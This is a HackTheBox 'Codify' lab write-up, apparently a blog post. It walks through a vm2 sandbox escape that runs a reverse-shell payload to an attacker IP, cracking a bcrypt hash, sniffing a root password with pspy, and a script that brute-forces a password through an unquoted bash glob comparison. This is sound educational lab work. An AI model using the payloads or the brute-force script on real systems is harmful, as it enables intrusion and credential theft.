---
title: Codify HackTheBox
author: Saad
date: 2024-11-23 00:00:00 +0500
categories:
  - HackTheBox
  - Easy Box
tags:
  - node.js
  - cve-2023-30547	
  - bash globbing
  - vm2 rce
  - bash pitfalls
image: codify.png
media_subpath: /assets/img/codify-htb
---

## Box Info:
Codfiy was an easy linux box featuring a web application where user can test `Node.js` code. Web application uses a vulnerable library `vm2` which can be exploited to get a shell. Enumerating the system user can find `SQLite` database containing a hash which can be cracked and used over SSH to get `user.txt`. This user can run a vulnerable `Bash` script that leads to privilege escalation to root on the box.

## Recon

### Nmap

First off, I'll run an nmap scan to see what we are up against.

```bash
➜  codify nmap -sCV -oN scan.txt 10.129.240.130 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 08:08 EST
Nmap scan report for 10.129.240.130
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.08 seconds
```

Looking at the results, we can see that port `22` (`SSH`), `80`, and `3000` are open. `80` is running `Apache httpd 2.4.52` and redirecting to `codify.htb`, where `3000` is `Node.js`.

I'll add `codify.htb` to my `/etc/hosts`.

```bash
echo '10.129.240.130 codify.htb' | sudo tee -a /etc/hosts
```

## Port 80 / 3000

Port **80** and **3000** are the same websites, but port **3000** is running as a proxy to the one on port **80**, likely for load balancing.
This can be confirmed after getting a shell and checking the `/etc/apache2/sites-enabled/000-default.conf` file.
I ran `ffuf` but found nothing interesting, so I moved on.

Looking at the page, we can see that it’s a JavaScript sandbox:
![](main_page.png)

Clicking on `Try it now` takes us to a `web editor` where we can test our code.

![](hi.png)

This page mentions that there are some limitations and links to `/limitations`. Looking at `/limitations`, it doesn't tell us a lot more but mentions some restricted `Node.js` modules. The restricted modules are `child_process` and `fs`. However, there is a whitelist of modules we can use:

![](limit.png)

Looking at `/about` reveals some interesting information about the library being used.

> The `vm2` library is a widely used and trusted tool for sandboxing JavaScript.

It also links to the actual repo of this [project](https://github.com/patriksimek/vm2). However, this project had been **discontinued** due to having critical vulnerabilities in it.

Looking over the Security tab on the GitHub repo, we can see a couple of critical vulnerabilities reported.

![](vulns.png)

## Shell as svc

As we saw earlier, we can run and test code on the website. Let's try one of the PoCs.
I'll use this [one](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac).


```js
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("bash -c 'bash -i >& /dev/tcp/10.10.x.x/9001 0>&1'").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

As I run the above code in the editor it just hangs in there.
![](shell_we.png)

But on the other hand there is a shell waiting for us.
```console
➜  codify nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.78] from (UNKNOWN) [10.129.240.130] 40776
bash: cannot set terminal process group (1253): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$
```
I'll upgrade the shell with the a simple technique.
```console
svc@codify:~$ script -qc /bin/bash /dev/null
svc@codify:~$ ^Z
[1]  + 54891 suspended  nc -nvlp 9001
➜  codify echo raw stty -echo;fg
[1]  + 54891 continued  nc -nvlp 9001

svc@codify:~$ export TERM=linux
svc@codify:~$
```
## Shell as joshua

There is nothing really much interesting in `svc`'s home directory, looking at `/var/www/`:
```console
svc@codify:~$ ls -lah ~
ls -lah ~
total 32K
drwxr-x--- 4 svc    svc    4.0K Sep 26  2023 .
drwxr-xr-x 4 joshua joshua 4.0K Sep 12  2023 ..
lrwxrwxrwx 1 svc    svc       9 Sep 14  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc    svc     220 Sep 12  2023 .bash_logout
-rw-r--r-- 1 svc    svc    3.7K Sep 12  2023 .bashrc
drwx------ 2 svc    svc    4.0K Sep 12  2023 .cache
drwxrwxr-x 5 svc    svc    4.0K Nov 23 12:41 .pm2
-rw-r--r-- 1 svc    svc     807 Sep 12  2023 .profile
-rw-r--r-- 1 svc    svc      39 Sep 26  2023 .vimrc
svc@codify:/var/www/contact$ ls ../
contact  editor  html
```
I found nothing interesting in `html` or `editor` but I found `tickets.db` in `contact`. So I assume this website isn't used anymore.
```console
svc@codify:/var/www/contact$ ls
index.js  package.json  package-lock.json  templates  tickets.db
```
`ticket.db` is an `SQLite` database, I'll dump it and see what's init.
```console
svc@codify:/var/www/contact$ sqlite3 tickets.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
INSERT INTO users VALUES(3,'joshua','$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2');
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT);
INSERT INTO tickets VALUES(1,'Tom Hanks','Need networking modules','I think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!','open');
INSERT INTO tickets VALUES(2,'Joe Williams','Local setup?','I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.','open');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',3);
INSERT INTO sqlite_sequence VALUES('tickets',5);
COMMIT;
```
There is an hash of user `joshua` who is an user on the box.
```console
svc@codify:/var/www/contact$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```
I'll crack the hash using `hashcat` and use the password over SSH.

```console
➜  codify hashcat hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
    <SNIP>

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

    <SNIP>
```
It tired to match the hash but there are four options, I'll tried all of them but `3200` worked out.

```console
➜  codify hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
    <SNIP>
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
    <SNIp>
```
The password is `spongebob1`.

### su / SSH

**su**
```console
svc@codify:/var/www/contact$ su joshua
Password:
joshua@codify:/var/www/contact$ cd ~
joshua@codify:~$
```
**SSH**
```console
ssh joshua@codify.htb
The authenticity of host 'codify.htb (10.129.240.130)' can't be established.
    <SNIP>
joshua@codify.htb's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
    <SNIP>
joshua@codify:~$
```

## Shell as root

### mysql-backup.sh

joshua has some sudo power.
```console
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
The script itself just backups the database.
`mysql-backup.sh`
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!
```

### flaws

It's reading credentials from /root/.creds, but we can't access it.

This Bash script contains two vulnerabilities. The first one appears in this code snippet:
```bash
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```
It's comparison issue where `$USER_PASS` is not in `"`. It can be bypassed and with bash globbing we can leak the value of `$DB_PASS`. It's an [issue with Bash](https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D).

The 2nd one, in this code snippet:
```bash
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done
```
The `mysql` and `mysqldump` commands are executed by passing the password via the command line. Both use the password from the file, not the one provided by the user. This means that any user monitoring the process list can easily see the password.

### leveraging

Script prompts for a password and entering the wrong password it exists it out.
```console
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root:
Password confirmation failed!
```
But when entering `*`, it bypasses the check.
```console
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root:
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```
#### process monitoring
I'll upload [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) onto the box and monitor the process to caught the password.
```console
joshua@codify:~$ wget 10.10.14.78/pspy64
--2024-11-23 15:18:38--  http://10.10.14.78/pspy64
Connecting to 10.10.14.78:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                       100%[=============================================>]   2.96M   659KB/s    in 4.7s

2024-11-23 15:18:43 (644 KB/s) - ‘pspy64’ saved [3104768/3104768]

joshua@codify:~$
```

```console
Serving on http://0.0.0.0:80
10.129.240.130 - - [2024-11-23 10:18:32] "GET /pspy64 HTTP/1.1" 200 -
```

```console
joshua@codify:~$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
    <SNIP>
2024/11/23 15:26:28 CMD: UID=0     PID=2459   | /bin/bash /opt/scripts/mysql-backup.sh
2024/11/23 15:26:28 CMD: UID=0     PID=2460   | /usr/bin/echo Password confirmed!
2024/11/23 15:26:28 CMD: UID=0     PID=2461   | /bin/bash /opt/scripts/mysql-backup.sh
2024/11/23 15:26:28 CMD: UID=0     PID=2464   | /usr/bin/grep -Ev (Database|information_schema|performance_schema)
2024/11/23 15:26:28 CMD: UID=0     PID=2463   | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;
2024/11/23 15:26:28 CMD: UID=0     PID=2462   | /bin/bash /opt/scripts/mysql-backup.sh
2024/11/23 15:26:28 CMD: UID=0     PID=2466   |
2024/11/23 15:26:28 CMD: UID=0     PID=2468   | /bin/bash /opt/scripts/mysql-backup.sh
2024/11/23 15:26:28 CMD: UID=0     PID=2467   | /bin/bash /opt/scripts/mysql-backup.sh
2024/11/23 15:26:29 CMD: UID=0     PID=2469   | /bin/bash /opt/scripts/mysql-backup.sh
2024/11/23 15:26:29 CMD: UID=0     PID=2471   | /bin/bash /opt/scripts/mysql-backup.sh
2024/11/23 15:26:29 CMD: UID=0     PID=2470   | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys
2024/11/23 15:26:30 CMD: UID=0     PID=2472   |
2024/11/23 15:26:30 CMD: UID=0     PID=2473   | /bin/bash /opt/scripts/mysql-backup.sh
2024/11/23 15:26:30 CMD: UID=0     PID=2474   | /usr/bin/chown root:sys-adm /var/backups/mysql
    <SNIP>
```
As we can see in the `pspy64`'s output the password of root is `kljh12k3jhaskjh12kjh3`. (`-p` is password flag.)

#### brute forcing

When I enter "k*" it works.
```console
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root:
Password confirmed!
```
This Bash script can brute-force the root password by iteratively appending characters using wildcards to test different combinations until the correct password is found.
```bash
#!/bin/bash

leaked_password=""
valid_chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}\|;:'\",<.>/?"
previous_password=""

while :; do
    for char in $(echo "$valid_chars" | sed 's/./& /g'); do
        if [[ "$char" =~ [*\\%] ]]; then
            continue
        fi
        printf "\rTrying: %s%s" "$leaked_password" "$char"
        result=$(echo -n "$leaked_password$char*" | sudo /opt/scripts/mysql-backup.sh 2>&1)
        if [[ $? -eq 124 || "$result" == *"Password confirmed"* ]]; then
            leaked_password+="$char"
            break
        fi
    done
    if [[ "$leaked_password" == "$previous_password" ]]; then
        # If the password hasn't changed, exit the loop
        echo -e "\nPassword fully leaked: $leaked_password"
        exit 0
    fi
    previous_password="$leaked_password"
    printf "\rLeaked Password: %s" "$leaked_password"
    sleep 0.1  # Small delay to avoid spamming
done
```